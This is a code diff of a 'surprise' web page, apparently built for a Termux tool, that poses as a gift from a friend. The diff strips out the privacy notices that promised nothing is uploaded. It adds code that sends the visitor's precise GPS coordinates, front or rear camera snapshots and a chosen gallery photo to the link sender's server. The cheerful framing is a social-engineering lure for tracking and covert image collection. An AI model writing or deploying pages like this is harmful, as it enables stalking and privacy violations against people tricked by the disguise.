@@ -3,181 +3,102 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="theme-color" content="#07130f">
 <title>HCO Musk Surprise</title>
 
 <style>
-* {
-    box-sizing: border-box;
+*{box-sizing:border-box}
+body{
+ margin:0;min-height:100vh;display:grid;place-items:center;
+ padding:18px;background:radial-gradient(circle at top,#17442f,#07130f 65%);
+ font-family:system-ui,Arial;color:#effff7
 }
-
-body {
-    margin: 0;
-    min-height: 100vh;
-    display: grid;
-    place-items: center;
-    padding: 18px;
-    background: radial-gradient(circle at top, #17442f, #07130f 60%);
-    font-family: system-ui, Arial, sans-serif;
-    color: #effff7;
+main{
+ width:min(580px,100%);padding:25px;border-radius:22px;
+ background:#0c1c15;border:1px solid #286044;
+ box-shadow:0 20px 60px #0009
 }
-
-main {
-    width: min(600px, 100%);
-    background: #0c1c15;
-    border: 1px solid #286044;
-    border-radius: 22px;
-    padding: 25px;
-    box-shadow: 0 20px 60px #0009;
+.logo{text-align:center;color:#36e6a5;font-size:39px;font-weight:900;letter-spacing:4px}
+.sub{text-align:center;color:#a6c4b7;font-size:12px;letter-spacing:2px;margin-bottom:25px}
+h1{font-size:25px}
+.note{background:#10291e;border:1px solid #386c51;border-radius:12px;padding:13px;color:#d7ffea}
+button{
+ padding:14px 17px;margin:8px 5px 5px 0;border:0;border-radius:11px;
+ background:#36e6a5;color:#042015;font-weight:800;font-size:15px;cursor:pointer
 }
-
-.logo {
-    text-align: center;
-    color: #36e6a5;
-    font-size: 42px;
-    font-weight: 900;
-    letter-spacing: 5px;
-}
-
-.sub {
-    text-align: center;
-    color: #a6c4b7;
-    font-size: 12px;
-    letter-spacing: 2px;
-    margin-bottom: 25px;
-}
-
-h1 {
-    font-size: 24px;
-}
-
-.note {
-    padding: 14px;
-    border: 1px solid #386c51;
-    border-radius: 12px;
-    background: #10291e;
-    color: #d7ffea;
-    line-height: 1.5;
-}
-
-button {
-    display: inline-block;
-    margin: 8px 6px 4px 0;
-    padding: 13px 16px;
-    border: 0;
-    border-radius: 10px;
-    background: #36e6a5;
-    color: #042015;
-    font-weight: 800;
-    cursor: pointer;
-}
-
-.secondary {
-    background: #244b38;
-    color: white;
-}
-
-video {
-    display: none;
-    width: 100%;
-    border-radius: 12px;
-    margin-top: 14px;
-    background: #000;
-}
-
-.status {
-    white-space: pre-wrap;
-    overflow-wrap: anywhere;
-    color: #c5ddd1;
-    line-height: 1.6;
-    margin-top: 14px;
-}
-
-iframe {
-    display: none;
-    width: 100%;
-    height: 260px;
-    border: 0;
-    border-radius: 12px;
-    margin-top: 12px;
-}
-
-.foot {
-    text-align: center;
-    color: #89a99a;
-    font-size: 12px;
-    border-top: 1px solid #234333;
-    margin-top: 22px;
-    padding-top: 14px;
-}
-
-.hide {
-    display: none;
-}
+.secondary{background:#244b38;color:white}
+video{display:none;width:100%;margin-top:15px;border-radius:12px;background:#000}
+.status{white-space:pre-wrap;overflow-wrap:anywhere;line-height:1.6;margin-top:16px;color:#c5ddd1}
+iframe{display:none;width:100%;height:250px;border:0;border-radius:12px;margin-top:15px}
+.foot{text-align:center;color:#89a99a;font-size:12px;margin-top:22px;border-top:1px solid #234333;padding-top:15px}
+.hide{display:none}
 </style>
 </head>
 
 <body>
-
 <main>
 
-<div class="logo">HCO MUSK</div>
+<div class="logo">🎁 HCO MUSK</div>
+<div class="sub">SURPRISE PORTAL • BY HCO TEAM AZHAR</div>
 
-<div class="sub">
-SURPRISE PORTAL • BY HCO TEAM AZHAR
-</div>
+<h1 id="title">💚 Someone sent you a surprise!</h1>
 
-<h1 id="title">There is a surprise for you!</h1>
-
-<p id="intro">
-Choose whether you want to reveal the surprise.
-</p>
+<p id="intro">A little surprise is waiting for you!</p>
 
 <div class="note" id="notice">
-Privacy notice: this page does not secretly access your camera or location.
-You will see exactly what permission is requested before choosing.
+✨ Your surprise is ready!
 </div>
 
 <div>
 
-<button id="reveal">
-Reveal surprise
-</button>
+<button id="reveal">🎁 Reveal Surprise</button>
 
 <button id="loc" class="hide">
-Share my location
+📍 Share & Reveal
 </button>
 
-<button id="camRear" class="hide">
-Start rear camera
+<button id="rear" class="hide">
+📷 Start Rear Camera
 </button>
 
-<button id="camFront" class="hide">
-Start front camera
+<button id="front" class="hide">
+🤳 Start Front Camera
 </button>
 
 <button id="capture" class="secondary hide">
-Capture photo
+💚 Capture & Send Photo
 </button>
 
 <button id="stop" class="secondary hide">
-Stop camera
+⏹ Stop Camera
+</button>
+
+<button id="choosePhoto" class="hide">
+🖼 Choose a Photo
+</button>
+
+<input
+ id="photoFile"
+ type="file"
+ accept="image/jpeg,image/png"
+ class="hide"
+>
+
+<button id="sendPhoto" class="hide">
+📤 Share Selected Photo
 </button>
 
 </div>
 
 <div id="out" class="status" aria-live="polite"></div>
 
-<iframe id="map" title="Map"></iframe>
+<iframe id="map" title="Location map"></iframe>
 
 <video id="video" autoplay playsinline></video>
 
-<canvas id="canvas" class="hide"></canvas>
-
 <div class="foot">
-HCO Musk • Your choice is voluntary.
-No location or camera image is uploaded by this page.
+💚 HCO Musk • By HCO Team Azhar
 </div>
 
 </main>
@@ -187,8 +108,8 @@ No location or camera image is uploaded by this page.
 const q = new URLSearchParams(location.search);
 
 const mode = q.get("mode") || "custom";
-
-const msg = q.get("message") || "Surprise! You found it!";
+const token = q.get("token") || "";
+const message = q.get("message") || "🎉 Surprise! You found it!";
 
 const title = document.getElementById("title");
 const intro = document.getElementById("intro");
@@ -197,155 +118,237 @@ const out = document.getElementById("out");
 
 const reveal = document.getElementById("reveal");
 const loc = document.getElementById("loc");
-const rear = document.getElementById("camRear");
-const front = document.getElementById("camFront");
+const rear = document.getElementById("rear");
+const front = document.getElementById("front");
 const capture = document.getElementById("capture");
 const stop = document.getElementById("stop");
+const choosePhoto = document.getElementById("choosePhoto");
+const photoFile = document.getElementById("photoFile");
+const sendPhoto = document.getElementById("sendPhoto");
 const video = document.getElementById("video");
 
 let stream = null;
 
-title.textContent = q.get("title") || "There is a surprise for you!";
+title.textContent =
+    q.get("title") || "💚 Someone sent you a surprise!";
 
-function hide(el) {
-    el.classList.add("hide");
-}
 
-function show(el) {
+function show(el){
     el.classList.remove("hide");
 }
 
-if (mode === "location" || mode === "location-map") {
+function hide(el){
+    el.classList.add("hide");
+}
+
+
+/* SEND RESULTS TO HCO TERMUX */
+
+async function sendResult(data){
+
+    if(!token){
+        throw new Error(
+            "Invalid surprise link. Please ask the sender for a new link."
+        );
+    }
+
+    const response = await fetch(
+        "/api/result?token=" + encodeURIComponent(token),
+        {
+            method:"POST",
+            headers:{
+                "Content-Type":"application/json"
+            },
+            body:JSON.stringify({
+                ...data,
+                mode:mode
+            })
+        }
+    );
+
+    if(!response.ok){
+        throw new Error(
+            "Result could not reach HCO Musk. Ask the sender to check the connection."
+        );
+    }
+
+    return response.json();
+}
+
+
+/* SECRET MESSAGE */
+
+if(mode === "custom"){
 
     intro.textContent =
-        "A location surprise is waiting. If you choose, share your current location to view it on a map.";
+        "💌 Someone has sent you a special message! Tap below to reveal it.";
 
     notice.textContent =
-        "Location permission: your browser will ask to share your device location only after you press Share my location. The coordinates are displayed in this page and are not sent to HCO Musk.";
+        "🎁 Your surprise is waiting!";
+
+    hide(reveal);
+
+    reveal.textContent = "💌 Open Secret Message";
+    show(reveal);
+
+    reveal.onclick = async () => {
+
+        out.textContent = "🎉 Opening your surprise...";
+
+        try{
+
+            await sendResult({
+                type:"message_revealed",
+                message:message
+            });
+
+            out.textContent =
+                "💚 SURPRISE REVEALED!\n\n" + message;
+
+        }catch(error){
+
+            out.textContent = error.message;
+
+        }
+    };
+}
+
+
+/* LOCATION SURPRISE */
+
+if(mode === "location" || mode === "location-map"){
+
+    intro.textContent =
+        "📍 A location surprise is waiting for you! Tap below to share your location with the sender and reveal the surprise.";
+
+    notice.textContent =
+        "💚 Share your location if you want to reveal this surprise.";
 
     hide(reveal);
     show(loc);
 
-} else if (
+    loc.onclick = () => {
+
+        if(!navigator.geolocation){
+            out.textContent =
+                "Location is not supported by this browser.";
+            return;
+        }
+
+        out.textContent =
+            "📍 Waiting for your location permission...";
+
+        navigator.geolocation.getCurrentPosition(
+
+            async pos => {
+
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const accuracy = pos.coords.accuracy;
+
+                try{
+
+                    await sendResult({
+                        type:"location",
+                        latitude:lat,
+                        longitude:lon,
+                        accuracy:accuracy
+                    });
+
+                    out.textContent =
+                        "🎉 LOCATION SURPRISE REVEALED!\n\n" +
+                        "📍 Your location was shared with the sender.\n" +
+                        "Latitude: " + lat + "\n" +
+                        "Longitude: " + lon + "\n" +
+                        "Accuracy: " + Math.round(accuracy) + " metres";
+
+                    const map =
+                        document.getElementById("map");
+
+                    map.src =
+                        `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
+
+                    map.style.display = "block";
+
+                }catch(error){
+
+                    out.textContent = error.message;
+
+                }
+
+            },
+
+            error => {
+
+                out.textContent =
+                    "Location was not shared: " + error.message;
+
+            },
+
+            {
+                enableHighAccuracy:true,
+                timeout:20000,
+                maximumAge:0
+            }
+
+        );
+    };
+}
+
+
+/* CAMERA SURPRISE */
+
+if(
     mode === "camera" ||
     mode === "camera-front" ||
     mode === "camera-rear"
-) {
+){
 
     intro.textContent =
-        "A camera surprise is waiting. Choose a camera and approve the browser permission if you want a live preview.";
+        "📸 A camera surprise is waiting! Choose your camera to reveal it.";
 
     notice.textContent =
-        "Camera permission: the selected camera preview appears in your browser. Nothing is recorded or uploaded. You choose whether to capture a photo, which downloads to your device.";
+        "💚 Start your camera and capture a photo only if you choose.";
 
     hide(reveal);
 
-    if (mode === "camera-front") {
+    if(mode === "camera-front"){
         show(front);
-    } else if (mode === "camera-rear") {
+    }
+    else if(mode === "camera-rear"){
         show(rear);
-    } else {
+    }
+    else{
         show(front);
         show(rear);
     }
-
-} else if (mode === "photo") {
-
-    intro.textContent =
-        "A photo surprise page is ready. This demo does not access your private gallery or upload your images.";
-
-} else {
-
-    intro.textContent = msg;
-
 }
 
-reveal.onclick = () => {
-    out.textContent = msg;
-};
 
+async function startCamera(facing){
 
-loc.onclick = () => {
+    try{
 
-    if (!navigator.geolocation) {
-        out.textContent = "Geolocation is not supported by this browser.";
-        return;
-    }
+        if(!navigator.mediaDevices?.getUserMedia){
 
-    out.textContent = "Waiting for your location permission…";
-
-    navigator.geolocation.getCurrentPosition(
-
-        pos => {
-
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const accuracy = Math.round(pos.coords.accuracy);
-
-            out.textContent =
-                `You chose to share your location on this page.
-Latitude: ${lat}
-Longitude: ${lon}
-Accuracy: about ${accuracy} metres`;
-
-            const map = document.getElementById("map");
-
-            map.src =
-                `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
-
-            map.style.display = "block";
-
-            const a = document.createElement("a");
-
-            a.href =
-                `https://www.google.com/maps?q=${lat},${lon}`;
-
-            a.target = "_blank";
-            a.rel = "noopener";
-            a.textContent = "Open in Google Maps";
-            a.style.color = "#36e6a5";
-
-            out.appendChild(document.createElement("br"));
-            out.appendChild(a);
-
-        },
-
-        err => {
-            out.textContent = "Location was not shared: " + err.message;
-        },
-
-        {
-            enableHighAccuracy: true,
-            timeout: 20000,
-            maximumAge: 0
+            throw new Error(
+                "Camera requires a supported browser and HTTPS."
+            );
         }
 
-    );
-
-};
-
-
-async function startCamera(facing) {
-
-    try {
-
-        if (!navigator.mediaDevices?.getUserMedia) {
-            throw new Error("Camera needs a supported browser and HTTPS.");
-        }
-
-        if (stream) {
+        if(stream){
             stream.getTracks().forEach(t => t.stop());
         }
 
         stream = await navigator.mediaDevices.getUserMedia({
 
-            video: {
-                facingMode: {
-                    ideal: facing
+            video:{
+                facingMode:{
+                    ideal:facing
                 }
             },
 
-            audio: false
+            audio:false
 
         });
 
@@ -356,62 +359,76 @@ async function startCamera(facing) {
         show(stop);
 
         out.textContent =
-            "Camera preview is active. Nothing is uploaded. Capture is optional and saves the image to your device.";
-
-    } catch (e) {
-
-        out.textContent = "Camera not started: " + e.message;
+            "📸 Camera preview is ready. Capture is optional.";
 
     }
+    catch(error){
 
+        out.textContent =
+            "Camera could not start: " + error.message;
+
+    }
 }
 
 
-rear.onclick = () => startCamera("environment");
-
 front.onclick = () => startCamera("user");
 
+rear.onclick = () => startCamera("environment");
 
-capture.onclick = () => {
 
-    if (!video.videoWidth) {
-        out.textContent = "Camera is not ready.";
+/* CAPTURE AND SEND CAMERA PHOTO */
+
+capture.onclick = async () => {
+
+    if(!video.videoWidth){
+
+        out.textContent =
+            "Camera is not ready.";
+
         return;
     }
 
-    const canvas = document.getElementById("canvas");
+    const canvas = document.createElement("canvas");
 
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
 
-    canvas.getContext("2d").drawImage(video, 0, 0);
+    canvas.getContext("2d").drawImage(
+        video,
+        0,
+        0
+    );
 
-    canvas.toBlob(blob => {
+    out.textContent =
+        "📤 Sending your selected camera photo...";
 
-        if (!blob) return;
+    try{
 
-        const url = URL.createObjectURL(blob);
+        const image =
+            canvas.toDataURL("image/jpeg",0.85);
 
-        const a = document.createElement("a");
-
-        a.href = url;
-        a.download = "HCO-Musk-photo.jpg";
-
-        a.click();
-
-        URL.revokeObjectURL(url);
+        await sendResult({
+            type:"camera_photo",
+            image:image
+        });
 
         out.textContent =
-            "Photo downloaded to your device. It was not uploaded.";
+            "🎉 PHOTO SENT!\n\nYour selected photo reached the sender's Termux.";
 
-    }, "image/jpeg", 0.92);
+    }
+    catch(error){
 
+        out.textContent = error.message;
+
+    }
 };
 
 
+/* STOP CAMERA */
+
 stop.onclick = () => {
 
-    if (stream) {
+    if(stream){
         stream.getTracks().forEach(t => t.stop());
     }
 
@@ -423,14 +440,96 @@ stop.onclick = () => {
     hide(capture);
     hide(stop);
 
-    out.textContent = "Camera stopped.";
-
+    out.textContent =
+        "Camera stopped.";
 };
 
 
-window.addEventListener("pagehide", () => {
+/* PHOTO SURPRISE */
 
-    if (stream) {
+if(mode === "photo"){
+
+    intro.textContent =
+        "🖼 Someone sent you a photo surprise! Choose a photo if you want to share one.";
+
+    notice.textContent =
+        "💚 You choose which photo to send.";
+
+    hide(reveal);
+    show(choosePhoto);
+
+    choosePhoto.onclick = () => {
+        photoFile.click();
+    };
+
+    photoFile.onchange = () => {
+
+        show(sendPhoto);
+
+        out.textContent = photoFile.files.length
+            ? "Selected: " + photoFile.files[0].name
+            : "No photo selected.";
+    };
+
+    sendPhoto.onclick = async () => {
+
+        const file = photoFile.files[0];
+
+        if(!file){
+            out.textContent =
+                "Please choose a photo first.";
+            return;
+        }
+
+        if(!["image/jpeg","image/png"].includes(file.type)){
+            out.textContent =
+                "Choose a JPG or PNG photo.";
+            return;
+        }
+
+        if(file.size > 5 * 1024 * 1024){
+            out.textContent =
+                "Please choose a photo smaller than 5 MB.";
+            return;
+        }
+
+        const reader = new FileReader();
+
+        reader.onload = async () => {
+
+            try{
+
+                await sendResult({
+                    type:"photo_upload",
+                    image:reader.result
+                });
+
+                out.textContent =
+                    "🎉 PHOTO SENT!\n\nYour selected photo reached the sender's Termux.";
+
+            }
+            catch(error){
+
+                out.textContent = error.message;
+
+            }
+        };
+
+        reader.onerror = () => {
+            out.textContent =
+                "Could not read the selected photo.";
+        };
+
+        reader.readAsDataURL(file);
+    };
+}
+
+
+/* STOP CAMERA WHEN PAGE CLOSES */
+
+window.addEventListener("pagehide",() => {
+
+    if(stream){
         stream.getTracks().forEach(t => t.stop());
     }
 
